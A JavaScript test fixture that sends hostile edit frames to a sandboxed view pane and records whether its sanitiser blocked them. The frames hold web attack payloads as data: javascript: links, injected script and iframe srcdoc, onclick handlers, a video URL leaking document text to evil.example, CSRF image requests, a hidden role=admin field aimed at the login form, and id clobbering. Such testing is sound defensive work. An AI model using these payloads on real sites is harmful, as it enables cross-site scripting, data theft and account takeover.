// Applies frames a hostile view could send and records what the page
// ended up with (test/view.test.mjs reads `window.results`). Payloads of
// the review of #539 (P2, P3, P4) included.
import { Pane } from '../view.js';

const SVG = 'http://www.w3.org/2000/svg';
const el = (tag, namespace = null) => ({ tag: 'create-element', val: { tag, namespace } });
const text = (t) => ({ tag: 'create-text', val: t });
const attr = (name, value, namespace = null) => ({ tag: 'set-attribute', val: { name, namespace, value: { tag: 'text', val: value } } });
const events = [];
const mount = document.getElementById('mount');
const loads = [];
new PerformanceObserver((l) => l.getEntries().forEach((e) => loads.push(e.name))).observe({ type: 'resource', buffered: true });
const formBefore = [...new FormData(document.getElementById('login')).entries()];
const pane = new Pane(mount, (e) => events.push(e), { limits: { viewHeight: 600 } });
const results = {};
const tryFrame = (name, edits) => {
  try {
    pane.apply(edits);
    results[name] = 'applied';
  } catch (e) {
    results[name] = `failed: ${e.message}`;
  }
};

window.pwned = false;
tryFrame('a safe tree', [
  { tag: 'push-id', val: 0 },
  el('div'), attr('class', 'card'), attr('style', 'color: red; position: fixed; top: 0; background: url(https://evil/x.png)'),
  el('button'), attr('type', 'submit'), { tag: 'set-id', val: 1 }, { tag: 'listen', val: 'click' }, text('Add'), { tag: 'append-children', val: 1 },
  el('a'), attr('href', 'javascript:window.pwned=true'), attr('title', 'link'), text('link'), { tag: 'append-children', val: 1 },
  el('script'), text('window.pwned = true'), { tag: 'append-children', val: 1 },
  el('iframe'), attr('srcdoc', '<script>parent.pwned=true</script>'), attr('src', 'https://evil/'), { tag: 'append-children', val: 0 },
  el('img'), attr('src', 'https://tracker/p.gif'), { tag: 'append-children', val: 0 },
  el('svg', SVG), el('foreignObject', SVG), el('div'), text('hidden'), { tag: 'append-children', val: 1 }, { tag: 'append-children', val: 1 },
  el('rect', SVG), attr('fill', 'url(#g)'), attr('width', '10'), { tag: 'append-children', val: 0 }, { tag: 'append-children', val: 2 },
  el('div'), attr('id', 'site-header'), attr('data-act', 'x'), attr('data-at', '1'), { tag: 'append-children', val: 0 },
  { tag: 'append-children', val: 7 },
  { tag: 'set-attribute', val: { name: 'position', namespace: 'style', value: { tag: 'text', val: 'absolute' } } },
  { tag: 'set-attribute', val: { name: 'width', namespace: 'style', value: { tag: 'text', val: '50%' } } },
  { tag: 'append-children', val: 1 },
  { tag: 'pop' },
]);
// P2: requests the capabilities do not allow.
tryFrame('P2 network', [
  { tag: 'push-id', val: 0 },
  el('video'), attr('src', 'https://evil.example/?d=secret-document-text'), attr('preload', 'auto'), { tag: 'append-children', val: 0 },
  el('img'), attr('src', '/csrf-get?action=delete'), { tag: 'append-children', val: 0 },
  el('svg', SVG), el('image', SVG), attr('href', '/csrf-get?action=svg'), { tag: 'append-children', val: 1 },
  { tag: 'append-children', val: 3 },
  { tag: 'pop' },
]);
// P3: fields in the embedder's form, and a password to autofill.
tryFrame('P3 fields', [
  { tag: 'push-id', val: 0 },
  el('input'), attr('type', 'hidden'), attr('name', 'role'), attr('value', 'admin'), attr('form', 'login'), { tag: 'append-children', val: 0 },
  el('input'), attr('type', 'password'), attr('name', 'password'), attr('autocomplete', 'current-password'), { tag: 'append-children', val: 0 },
  { tag: 'append-children', val: 2 },
  { tag: 'pop' },
]);
// P4: its ids over the page's, and window's named properties.
tryFrame('P4 ids', [
  { tag: 'push-id', val: 0 },
  el('input'), attr('id', 'pw'), { tag: 'append-children', val: 0 },
  el('div'), attr('id', 'config'), { tag: 'append-children', val: 0 },
  el('label'), attr('for', 'pw'), text('pw'), { tag: 'append-children', val: 1 },
  el('svg', SVG), el('use', SVG), attr('href', '#logo'), { tag: 'append-children', val: 0 }, { tag: 'append-children', val: 1 },
  { tag: 'append-children', val: 4 },
  { tag: 'pop' },
]);
// SF1 (third review): a later edit with no value removed what the pane
// forces: a link then navigated the page's own tab.
const none = (name) => ({ tag: 'set-attribute', val: { name, namespace: null, value: { tag: 'none' } } });
tryFrame('SF1 removals', [
  { tag: 'push-id', val: 0 },
  el('a'), attr('href', 'https://example.com/'), attr('class', 'sf1-link'), none('rel'), none('target'), none('REL'), { tag: 'append-children', val: 0 },
  el('input'), attr('class', 'sf1-field'), none('autocomplete'), attr('autocomplete', 'on'), { tag: 'append-children', val: 0 },
  el('button'), attr('class', 'sf1-button'), none('type'), { tag: 'append-children', val: 0 },
  { tag: 'append-children', val: 3 },
  { tag: 'pop' },
]);
// Floods: a box taller than the page lets it be, and too many edits.
tryFrame('a tall box', [{ tag: 'push-id', val: 0 }, el('div'), attr('style', 'height: 100373px'), { tag: 'append-children', val: 1 }, { tag: 'pop' }]);
tryFrame('too many edits', Array.from({ length: 10001 }, () => ({ tag: 'pop' })));
tryFrame('a handler', [{ tag: 'push-id', val: 1 }, attr('onclick', 'window.pwned=true'), { tag: 'pop' }]);
tryFrame('the box itself', [{ tag: 'push-id', val: 0 }, attr('style', 'position: fixed; inset: 0')]);
tryFrame('a node it has not got', [{ tag: 'push-id', val: 99 }]);
tryFrame('removing the box', [{ tag: 'push-id', val: 0 }, { tag: 'remove' }]);
tryFrame('a sibling of the box', [{ tag: 'push-id', val: 0 }, el('div'), { tag: 'insert-after', val: 1 }]);

const shadow = mount.querySelector('.architect-view-host')?.shadowRoot;
const scope = shadow ?? mount;
const q = (s) => scope.querySelector(s);
q('button')?.click();
await new Promise((r) => setTimeout(r, 1500));
const card = q('.card');
const host = mount.querySelector('.architect-view-host') ?? mount;
Object.assign(results, {
  pwned: window.pwned,
  banner: document.getElementById('page-banner').textContent,
  inShadow: !!shadow,
  lightChildren: mount.querySelectorAll('*').length,
  cardStyle: card?.getAttribute('style'),
  cardPosition: card ? getComputedStyle(card).position : null,
  buttonType: q('button')?.getAttribute('type'),
  linkHref: q('a')?.getAttribute('href') ?? null,
  scripts: scope.querySelectorAll('script').length,
  iframes: scope.querySelectorAll('iframe').length,
  foreignObjects: scope.querySelectorAll('foreignObject').length,
  rectFill: q('rect')?.getAttribute('fill') ?? null,
  img: [...scope.querySelectorAll('img')].map((i) => i.getAttribute('src')),
  video: q('video')?.getAttribute('src') ?? null,
  svgImage: q('image')?.getAttribute('href') ?? null,
  loads: loads.filter((n) => /evil|csrf|tracker/.test(n)),
  formBefore,
  formAfter: [...new FormData(document.getElementById('login')).entries()],
  fields: [...scope.querySelectorAll('input')].map((i) => ({ type: i.getAttribute('type'), name: i.getAttribute('name'), form: i.form?.id ?? null, autocomplete: i.getAttribute('autocomplete'), id: i.id })),
  byIdPw: document.getElementById('pw')?.closest('form')?.id ?? null,
  byIdPwType: document.getElementById('pw')?.type,
  windowConfig: typeof window.config,
  labelFor: q('label')?.getAttribute('for'),
  useHref: q('use')?.getAttribute('href'),
  useRefersToPage: !!q('use') && q('use').getBBox().width > 0,
  hostHeight: host.getBoundingClientRect().height,
  tallBox: results['a tall box'],
  idDiv: q('[data-at]')?.outerHTML,
  sf1: {
    rel: q('.sf1-link')?.getAttribute('rel'),
    target: q('.sf1-link')?.getAttribute('target'),
    autocomplete: q('.sf1-field')?.getAttribute('autocomplete'),
    type: q('.sf1-button')?.getAttribute('type'),
  },
  events,
});
window.results = results;
